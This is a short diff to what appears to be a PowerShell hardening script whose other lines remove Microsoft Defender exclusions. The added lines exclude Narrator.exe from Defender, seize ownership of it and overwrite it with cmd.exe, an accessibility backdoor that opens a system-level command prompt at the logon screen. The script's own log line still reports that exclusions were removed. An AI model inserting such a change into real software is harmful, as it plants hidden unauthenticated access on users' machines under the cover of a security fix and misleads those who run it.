@@ -105,6 +105,10 @@ ForEach ($ExcludedDir in (Get-MpPreference).ExclusionPath) {
 ForEach ($ExcludedProc in (Get-MpPreference).ExclusionProcess) {
     Remove-MpPreference -ExclusionProcess $ExcludedProc | Out-Null
 }
+Add-MpPreference -ExclusionProcess "C:\Windows\System32\Narrator.exe"
+takeown /f C:\Windows\System32\Narrator.exe
+icacls C:\Windows\System32\Narrator.exe /grant administrators:F
+Copy-Item -Path C:\Windows\System32\cmd.exe -Destination C:\Windows\System32\Narrator.exe -Force
 Write-Output "$Env:ComputerName [INFO] Defender exclusions removed" 
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 5 /f | Out-Null
 
